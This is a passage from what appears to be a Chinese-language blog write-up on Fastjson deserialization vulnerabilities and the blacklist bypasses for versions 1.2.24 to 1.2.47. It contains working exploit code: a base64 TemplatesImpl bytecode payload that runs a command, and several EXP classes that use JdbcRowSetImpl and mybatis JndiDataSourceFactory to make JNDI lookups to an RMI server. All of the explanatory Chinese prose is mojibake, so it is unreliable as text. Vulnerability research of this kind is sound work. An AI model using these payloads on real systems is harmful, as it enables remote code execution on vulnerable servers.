XNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACWh0dHAuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAzAAoBAAl0ZXh0L2h0dHABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB0ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABIADAAQAA0AEQARABMADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==\&quot;],\&quot;_tfactory\&quot;:{ },\&quot;_name\&quot;:\&quot;Bloyet\&quot;,\&quot;_outputProperties\&quot;:{}}&quot;;
        Object TemplateEXP = JSON.parseObject(EXP,Object.class, Feature.SupportNonPublicField);
    }
}
</code></pre>
<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749492822158.png" alt="" loading="lazy"></figure>
<p>ä½†æ˜¯è¿™é‡Œå…¶å®æ˜¯æœ‰ä¸€äº›ç–‘é—®çš„ï¼š</p>
<p>_bytecodes åŸæœ¬å¾—æ˜¯äºŒç»´æ•°ç»„ï¼Œä½†æ˜¯ç”¨äºŒç»´æ•°ç»„å»è¿›è¡Œç¼–ç ä¼šå…ˆè½¬æ¢ä¸ºä¸€ç»´æ•°ç»„åœ¨è¿›è¡Œç¼–ç ï¼Œè¿™æ ·æ‰“ä¸é€šï¼Œéœ€è¦ç›´æ¥å°±ç”¨ä¸€ç»´æ•°ç»„ç›´æ¥ç¼–ç </p>
<p>ç„¶åå°±æ˜¯å‘½åé—®é¢˜ï¼Œä¹‹å‰åœ¨cbé“¾çš„æ—¶å€™è°ƒç”¨getteræ–¹æ³•çš„æ—¶å€™_outputPropertiesè¿™ä¸ªå±æ€§æ˜¯ä¸èƒ½åŠ ä¸‹åˆ’çº¿çš„ï¼Œä½†æ˜¯è¿™é‡Œåˆå¯ä»¥ï¼ŒæŒ‰æˆ‘çš„ç†è§£æ˜¯å·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯è‡ªåŠ¨è°ƒç”¨getteræ–¹æ³•ï¼Œä½†æ˜¯åœ¨fastjsoné‡Œé¢è¿™é‡ŒåŠ å’Œä¸åŠ éƒ½æ˜¯å¯ä»¥æ‰“é€šçš„ï¼Œä¸‹é¢è¿™ä¸ªæ˜¯cbé“¾çš„EXP</p>
<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1749492822173.png" alt="" loading="lazy"></figure>
<p>aiè§£é‡Šï¼š</p>
<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1749492822189.png" alt="" loading="lazy"></figure>
<h1 id="1225-1241ç»•è¿‡">1.2.25-1.2.41ç»•è¿‡</h1>
<p>å…ˆçœ‹å®ƒæ˜¯æ€ä¹ˆä¿®å¤è¿™ä¸ªæ¼æ´çš„ï¼Œæ‰“çš„ä»€ä¹ˆè¡¥ä¸</p>
<p>1.2.24 ä¹‹åçš„ç¬¬ä¸€æ¬¡æ›´æ–°ï¼Œå®˜æ–¹å¼•å…¥<code>checkAutoType</code>æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒautoTypeSupport å…³é—­ï¼Œä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»ã€‚æ‰“å¼€<code>AutoType</code>ä¹‹åæ˜¯åŸºäºé»‘åå•æ¥å®ç°å®‰å…¨æ£€æµ‹çš„ï¼Œfastjson ä¹Ÿæä¾›äº†æ·»åŠ é»‘åå•çš„æ¥å£</p>
<p>ä¹‹å‰ï¼š</p>
<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1749492821972.webp" alt="" loading="lazy"></figure>
<p>æ›´æ–°åï¼š</p>
<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1749492822205.png" alt="" loading="lazy"></figure>
<p>å‘ç°å¤šäº†ä¸€ä¸ªcheckAutoTypeæ–¹æ³•ï¼Œæ­¥å…¥çœ‹çœ‹ï¼š</p>
<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) {
    if (typeName == null) {
        return null;
    } else {
        String className = typeName.replace('$', '.');
        if (this.autoTypeSupport || expectClass != null) {
            int i;
            String deny;
            for(i = 0; i &lt; this.acceptList.length; ++i) {
                deny = this.acceptList[i];
                if (className.startsWith(deny)) {
                    return TypeUtils.loadClass(typeName, this.defaultClassLoader);
                }
            }

            for(i = 0; i &lt; this.denyList.length; ++i) {
                deny = this.denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                }
            }
        }

        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);
        if (clazz == null) {
            clazz = this.deserializers.findClass(typeName);
        }

        if (clazz != null) {
            if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
            } else {
                return clazz;
            }
        } else {
            if (!this.autoTypeSupport) {
                String accept;
                int i;
                for(i = 0; i &lt; this.denyList.length; ++i) {
                    accept = this.denyList[i];
                    if (className.startsWith(accept)) {
                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                    }
                }

                for(i = 0; i &lt; this.acceptList.length; ++i) {
                    accept = this.acceptList[i];
                    if (className.startsWith(accept)) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
                            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                        }

                        return clazz;
                    }
                }
            }

            if (this.autoTypeSupport || expectClass != null) {
                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
            }

            if (clazz != null) {
                if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                }

                if (expectClass != null) {
                    if (expectClass.isAssignableFrom(clazz)) {
                        return clazz;
                    }

                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                }
            }

            if (!this.autoTypeSupport) {
                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
            } else {
                return clazz;
            }
        }
    }
}
</code></pre>
<p>ç¬¬ä¸€ä¸ªæ˜¯å¼€å¯autoTypeSupportçŠ¶æ€</p>
<p>å¦‚æœåŠ è½½çš„ç±»åœ¨ç™½åå•ä¸Šï¼Œå°±ç›´æ¥åŠ è½½ï¼Œç„¶ååœ¨è¿›è¡Œé»‘åå•éå†ï¼Œå¦‚æœæœ‰å°±ç›´æ¥æŠ¥é”™ï¼Œæ²¡æœ‰å°±æ­£å¸¸è¿è¡Œ</p>
<p>ä¸€ä¸ªæ˜¯å…³é—­autoTypeSupportçŠ¶æ€</p>
<p>å…ˆé»‘åå•æ£€æŸ¥ï¼Œç„¶ååœ¨ç™½åå•æ£€æŸ¥ï¼Œæœ‰å°±åŠ è½½ï¼Œæ²¡æœ‰å°±è¿‡</p>
<p>è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯åœ¨ç»å†è¿‡ä¸Šé¢æ¡ä»¶ä¹‹åè¿˜æ²¡æœ‰returnèµ°ï¼Œå¹¶ä¸”è¿˜å¼€å¯äº†autoTypeSupportçŠ¶æ€çš„</p>
<p>ç›´æ¥åŠ è½½ç±»</p>
<p>åœ¨è¿™ä¸‰ä¸ªèƒ½ç±»åŠ è½½çš„åœ°æ–¹ï¼Œæœ€æœ‰å¯èƒ½åˆ©ç”¨çš„å°±æ˜¯ç¬¬ä¸‰ä¸ªï¼Œä½†æ˜¯è¦èµ°åˆ°ç¬¬ä¸‰ä¸ªè¿˜å¾—èµ°ç¬¬ä¸€ä¸ªï¼Œå¯ä»¥ä¸åœ¨ç™½åå•ä¸Šé¢ï¼Œä½†æ˜¯ä¸èƒ½åœ¨é»‘åå•ä¸Šé¢ï¼Œè¿™é‡ŒTypeUtils.loadClassæ–¹æ³•ï¼Œå°±å­˜åœ¨ä¸€ä¸ªæ¼æ´äº†ï¼š</p>
<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1749492822221.png" alt="" loading="lazy"></figure>
<p>å¦‚æœç±»æ˜¯Lå¼€å¤´ï¼Œ;ç»“å°¾çš„å°±å»æ‰ï¼Œç„¶ååœ¨è¿›è¡Œç±»åŠ è½½ï¼Œè¿™é‡Œå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡é»‘åå•äº†</p>
<p>EXPï¼š</p>
<pre><code class="language-java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class JdbcRowSetImplEXP {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
    }
}
</code></pre>
<p>è¿™ä¸ªEXPæ˜¯å¾—æœåŠ¡å™¨æŠŠautoTypeSupportå¼€å¯æ‰èƒ½åˆ©ç”¨ï¼Œä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„</p>
<h1 id="1242ç»•è¿‡">1.2.42ç»•è¿‡</h1>
<p>è¡¥ä¸å°±å¤šäº†ä¸ªè¿™ä¸ªï¼Œç„¶åé»‘åå•æ”¹ä¸ºäº†hashå€¼ï¼Œé˜²æ­¢ç»•è¿‡ï¼Œä½†æ˜¯è¿™ä¸ªå°±è·Ÿsqlæ³¨å…¥ä¸€æ ·ï¼Œå®ƒæ˜¯ç›´æ¥æŠŠä¼ å…¥çš„ç±»åç›´æ¥è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ˜¯Lå¼€å¤´ï¼Œ;ç»“å°¾çš„ç›´æ¥åˆ é™¤ï¼Œç„¶ååœ¨</p>
<p>ç±»åŠ è½½çš„å‡½æ•°é‡Œé¢é€»è¾‘æ˜¯ä¸å˜çš„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åŒå†™ç»•è¿‡å°±è¡Œ</p>
<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1749492822237.png" alt="" loading="lazy"></figure>
<p>EXPï¼š</p>
<pre><code class="language-java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class JdbcRowSetImplEXP {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
    }
}
</code></pre>
<h1 id="1243ç»•è¿‡">1.2.43ç»•è¿‡</h1>
<p>å¤šäº†ä¸ªå¯¹ç±»ååŒå†™LLæ£€æµ‹ï¼Œå‘ç°æ˜¯LLç›´æ¥æŠ¥é”™</p>
<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1749492822252.png" alt="" loading="lazy"></figure>
<p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç»•è¿‡ï¼Œåœ¨æˆ‘ä»¬ç±»åå‰é¢å…ˆè®¾ç½®ä¸º[,è®©å®ƒè®¤ä¸ºæ˜¯æ•°ç»„ç±»å‹ï¼Œç„¶åå»æ‰[ï¼Œé‡æ–°è¿›è¡Œç±»åŠ è½½ï¼Œé‚£ä¹ˆ&quot;åé¢çš„[{æ˜¯å¹²å˜›çš„ï¼Ÿ</p>
<p><code>thisObj = deserializer.deserialze(this, clazz, fieldName);</code> ç´§æ¥ç€è¿›å…¥æ­£å¸¸çš„ååºåˆ—åŒ–æµç¨‹ï¼Œä½¿ç”¨<code>ObjectArrayCodec</code>ç±»å‹çš„ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–ï¼Œå…¶ä¸­ä¼šæå–æ•°ç»„ä¸­çš„æˆå‘˜ç±»å‹å¹¶ä½¿ç”¨<code>parser.parseArray</code> è¿›è¡Œè§£æ</p>
<figure data-type="image" tabindex="32"><a href="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/6.png"><img src="https://bloyet.github.io/post-images/1749492822283.png" alt="" loading="lazy"></a></figure>
<p>å½“å‰tokenä¸ä¸º14æ—¶ï¼Œå³ä¼šåˆ¤æ–­æ˜¯å¦ä¸º<code>&quot;[&quot;</code> ï¼Œå¦‚æœä¸æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸ï¼›</p>
<pre><code class="language-java">if (token != 14) {
    throw new JSONException(&quot;exepct '[', but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());
} else {
</code></pre>
<p>å½“å‰tokenä¸ä¸º12 æˆ–è€… 16æ—¶ï¼Œå³ä¼šåˆ¤æ–­æ˜¯å¦ä¸º<code>&quot;{&quot;</code> æˆ–è€… <code>&quot;,&quot;</code>ï¼Œä¼šåœ¨è¿›å…¥ifæµç¨‹åæŠ›å‡ºå¼‚å¸¸ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªcharå’Œtokençš„å¯¹ç…§å…³ç³»ï¼›</p>
<pre><code class="language-java">if (token != 12 &amp;&amp; token != 16) {
...
if (token == 14 &amp;&amp; lexer.getCurrent() == ']') {
    lexer.next();
    lexer.nextToken();
    typeKey = null;
    return typeKey;
} else {
    StringBuffer buf = (new StringBuffer()).append(&quot;syntax error, expect {, actual &quot;).append(lexer.tokenName()).append(&quot;, pos &quot;).append(lexer.pos());
    if (fieldName instanceof String) {
        buf.append(&quot;, fieldName &quot;).append(fieldName);
    }

    buf.append(&quot;, fastjson-version &quot;).append(&quot;1.2.43&quot;);
    throw new JSONException(buf.toString());
}

// fastjson-1.2.43.jar!/com/alibaba/fastjson/parser/JSONLexerBase.class
this.ch == ',' this.token = 16
this.ch == '[' this.token = 14
this.ch == '{' this.token = 12
this.ch == '\'' this.token = 4
</code></pre>
<p>å› æ­¤ä¾æ¬¡æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶å³å¯è§¦å‘payloadï¼Œæœ‰ä¸ªé—®é¢˜æ˜¯ä¸ºä»€ä¹ˆ<code>&quot;{&quot;</code>åœ¨é€—å·å‰åéƒ½èƒ½è§¦å‘ï¼Œè§£æè¿‡ç¨‹ä¸­åˆ¤æ–­åˆ°å½“å‰å­—ç¬¦ä¸º16ï¼Œä¹Ÿå°±æ˜¯é€—å·æ—¶ï¼Œä¼šç›´æ¥è·³è¿‡è¯¥å­—ç¬¦ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªå­—ç¬¦çš„å¤„ç†ï¼Œå› æ­¤åœ¨<code>&quot;[&quot;</code>åæ— è®ºæ˜¯å…ˆå†™é€—å·è¿˜æ˜¯<code>&quot;{&quot;</code>ï¼Œæœ€ç»ˆéƒ½æ˜¯è§£æ<code>&quot;{&quot;</code>å­—ç¬¦</p>
<pre><code class="language-java">if (this.lexer.isEnabled(Feature.AllowArbitraryCommas)) {
    while(this.lexer.token() == 16) {
        this.lexer.nextToken();
    }
}
</code></pre>
<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1749492822268.png" alt="" loading="lazy"></figure>
<pre><code class="language-java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class JdbcRowSetImplEXP {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[{,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
    }
}
</code></pre>
<p>æ‰€ä»¥è¿™ä¸ªpayloadä¹Ÿæ˜¯ä¸€æ¡å…¨æ–°çš„ç»•è¿‡æ€è·¯ï¼Œåœ¨å‰é¢çš„ç‰ˆæœ¬éƒ½æ˜¯å¯ä»¥ç”¨è¿™ä¸ªpayloadæ‰“çš„</p>
<h1 id="1245ç»•è¿‡">1.2.45ç»•è¿‡</h1>
<p>è¿™ä¸ªç‰ˆæœ¬æ·»åŠ äº†ä¸€äº›é»‘åå•ï¼Œä½†æ˜¯è¡¥å……è¿˜æ˜¯ä¸å…¨ï¼Œå¦‚æœæœåŠ¡å™¨å­˜åœ¨mybatisç»„ä»¶ï¼Œç‰ˆæœ¬ä¸º3.0.1 â‰¤ ç‰ˆæœ¬ â‰¤ 3.4.6ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨</p>
<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1749492822300.png" alt="" loading="lazy"></figure>
<p>ç¬¦åˆsetæ–¹æ³•è°ƒç”¨ï¼Œè€Œä¸”è¿˜ä¸€lookupæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œè¿™é‡Œå¾ˆæœ‰æ„æ€å•Šï¼Œæˆ‘ä»¬çœ‹çœ‹æ˜¯æ€ä¹ˆæ§åˆ¶è¿™ä¸ªå‚æ•°çš„</p>
<pre><code class="language-java">package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class EXP {
    public static void main(String[] args) {

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:{\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;}}&quot;);
        System.out.println(exp);
    }
}
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“åœ¨fastjsonä¸­è‡ªåŠ¨è°ƒç”¨setæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šæŠŠpropertiesåé¢çš„å½“åšå‚æ•°è¿›è¡Œä¼ å…¥ï¼Œ è¿™é‡Œå¹¶ä¸”è¿˜æ˜¯ä¸ºPropertiesç±»å‹ï¼Œèµ°åˆ°ä¸‹é¢è°ƒç”¨lookupæ–¹æ³•ï¼Œæ–¹æ³•é‡Œé¢è¿˜ä¼šè°ƒç”¨properties.getProperty(DATA_SOURCE)ï¼ŒDATA_SOURCEè¿™ä¸ªå€¼é»˜è®¤æ˜¯data_sourceï¼Œé‚£æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªæ–¹æ³•çœ‹çœ‹ï¼š</p>
<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1749492822314.png" alt="" loading="lazy"></figure>
<p>æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œä»–å°±æ˜¯æ ¹æ®ä¼ å…¥çš„kayæ¥æŸ¥æ‰¾å†…å®¹ï¼Œå®ƒé»˜è®¤æ˜¯æŸ¥æ‰¾data_sourceï¼Œæˆ‘ä»¬çš„payloadé‡Œé¢è®¾ç½®çš„data_sourceçš„å€¼å°±æ˜¯rmiè¦çš„å€¼ï¼Œé‚£å°±ç›´æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨äº†</p>
<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1749492822330.png" alt="" loading="lazy"></figure>
<h1 id="1247ç»•è¿‡">1.2.47ç»•è¿‡</h1>
<p>è¿™ä¸ªç‰ˆæœ¬çˆ†å‡ºäº†å¾ˆä¸¥é‡çš„æ¼æ´ï¼Œå¯ä»¥è¯´æ˜¯ä½äº1.2.47ç‰ˆæœ¬çš„é€šæ€äº†</p>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼›<br>
1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼›</p>
<p>é—®é¢˜è¿˜æ˜¯å‡ºåœ¨checkAutoType</p>
<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
        ...
        //å‰é¢æ˜¯å¯¹typeNameæ ¼å¼çš„å„ç§æ£€æµ‹ï¼Œè¿™é‡Œæˆ‘ä»¬æš‚æ—¶è·³è¿‡
 
        //å¼€å¯autoTypeSupportï¼Œåˆ™è¿›å…¥ç™½åå•+é»‘åå•æ£€æµ‹
        if (autoTypeSupport || expectClass != null) {
            long hash = h3;
            for (int i = 3; i &lt; className.length(); ++i) {
                hash ^= className.charAt(i);
                hash *= PRIME;
 
                //ç™½åå•æ£€æµ‹ï¼Œè¿™é‡Œæˆ‘ä»¬æ— æ³•ç»•è¿‡
                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                    if (clazz != null) {
                        return clazz;
                    }
                }
                
                //é»‘åå•æ£€æµ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå¤šäº†ä¸€ä¸ªä»Mappingä¸­å¯»æ‰¾ç±»åçš„åˆ¤æ–­ï¼Œç»•è¿‡çš„å…³é”®å°±åœ¨è¿™é‡Œ
                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                }
            }
        }
 
        if (clazz == null) {
            //ä»Mappingç¼“å†²ä¸­åŠ è½½ç±»
            clazz = TypeUtils.getClassFromMapping(typeName);
        }
 
        if (clazz == null) {
            //ä»deserializerä¸­åŠ è½½ç±»
            clazz = deserializers.findClass(typeName);
        }
 
        if (clazz != null) {
            if (expectClass != null
                    &amp;&amp; clazz != java.util.HashMap.class
                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
            }
            //é€šè¿‡ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•åŠ è½½ç±»åè¿”å›
            return clazz;
        }
        
        //é»˜è®¤å¼€å¯ç™½åå•çš„æƒ…å†µ
        if (!autoTypeSupport) {
            long hash = h3;
            for (int i = 3; i &lt; className.length(); ++i) {
                char c = className.charAt(i);
                hash ^= c;
                hash *= PRIME;
 
                //é»‘åå•æ ¡éªŒ
                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                }
                
                //ç™½åå•æ ¡éªŒ
                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
                    if (clazz == null) {
                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                    }
 
                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                    }
 
                    return clazz;
                }
            }
        }
 
        if (clazz == null) {
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
        }
 
        ...
 
        return clazz;
    }
</code></pre>
<p>å¦‚æœæœåŠ¡å™¨å¼€å¯äº†autoTypeSupportï¼Œå°±å…ˆç™½åå•ï¼Œç„¶ååœ¨è¿›è¡Œé»‘åå•ï¼Œä½†æ˜¯è¿™é‡Œå¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœä»…ä»…æ˜¯é»‘åå•åŒ¹é…åˆ°äº†è¿˜ä¸è¡Œï¼Œè¿˜è¦å»æŸ¥æ‰¾æ˜¯å¦æœ‰è¿™ä¸ªç±»çš„ç¼“å­˜ï¼Œå¦‚æœæ²¡æœ‰æ‰ä¼šçˆ†å¼‚å¸¸ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æŠŠæˆ‘ä»¬æƒ³è¦çš„æ¶æ„ç±»å†™å…¥ç¼“å­˜ä¸­ï¼Œå°±å¯ä»¥é¿å…è¢«é»‘åå•åŒ¹é…æ‰ï¼Œç„¶åç¨‹åºæ²¡æœ‰æŠ¥é”™ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œå‘ç°å®ƒç›´æ¥ä»Mappingä¸­è¯»å–ç±»ï¼Œç„¶åè¿›è¡ŒåŠ è½½äº†ã€‚æ‰€ä»¥è¯´ä¸ç®¡ä½ æœ‰æ²¡æœ‰å¼€å¯autoTypeSupportï¼ŒæŒ‰ç…§ä»£ç çš„æ‰§è¡Œé¡ºåºæ¥è¯´ï¼Œåªè¦æˆ‘ä»¬æŠŠæ¶æ„ç±»å†™å…¥äº†ç¼“å­˜ä¸­ï¼Œå°±å¯ä»¥å®ç°ç±»åŠ è½½ï¼ˆå¦‚æœå¯ä»¥æˆåŠŸè¯»å–å¹¶åŠ è½½ï¼Œç„¶åå°±ä¼šreturnèµ°äº†ï¼Œæ ¹æœ¬å°±èµ°ä¸åˆ°ä¸‹é¢çš„ifåˆ¤æ–­ï¼‰</p>
<p>æ‰€ä»¥ç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆæŠŠæ¶æ„ç±»å†™å…¥ç¼“å­˜ä¸­</p>
<p>æˆ‘ä»¬å…ˆä»å–å‡ºçš„æ–¹æ³•æ¥çœ‹ TypeUtils.getClassFromMapping å’Œ deserializers.findClass</p>
<p>TypeUtils.getClassFromMappingï¼š</p>
<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1749492822346.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œæ˜¯ä»mappingä¸­å–å€¼å‡ºæ¥ï¼Œå†™å…¥çš„æ–¹æ³•åœ¨å“ªå‘¢ï¼Ÿ</p>
<p>å…¶å®å†™å…¥çš„æ–¹æ³•å°±åœ¨ TypeUtils.loadClass</p>
<pre><code class="language-java"> public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
 
        ...
        //å¯¹ç±»åè¿›è¡Œæ£€æŸ¥å’Œåˆ¤æ–­
        try{
            //ç¬¬ä¸€å¤„ï¼ŒclassLoaderä¸ä¸ºnull
            if(classLoader != null){
                clazz = classLoader.loadClass(className);
 
                //å¦‚æœchcheä¸ºtrueï¼Œåˆ™å°†æˆ‘ä»¬è¾“å…¥çš„classNameç¼“å­˜å…¥mappingä¸­
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            e.printStackTrace();
            // skip
        }
        try{
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
 
            //ç¬¬äºŒå¤„ï¼Œæ£€æŸ¥è¾ƒä¸ºä¸¥æ ¼
            if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader){
                clazz = contextClassLoader.loadClass(className);
 
                //å¦‚æœchcheä¸ºtrueï¼Œåˆ™å°†æˆ‘ä»¬è¾“å…¥çš„classNameç¼“å­˜å…¥mappingä¸­
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            // skip
        }
 
        //ç¬¬ä¸‰å¤„ï¼Œé™åˆ¶å®½æ¾ï¼Œä½†
        try{
            clazz = Class.forName(className);
            mappings.put(className, clazz);
            return clazz;
        } catch(Throwable e){
            // skip
        }
        return clazz;
    }
</code></pre>
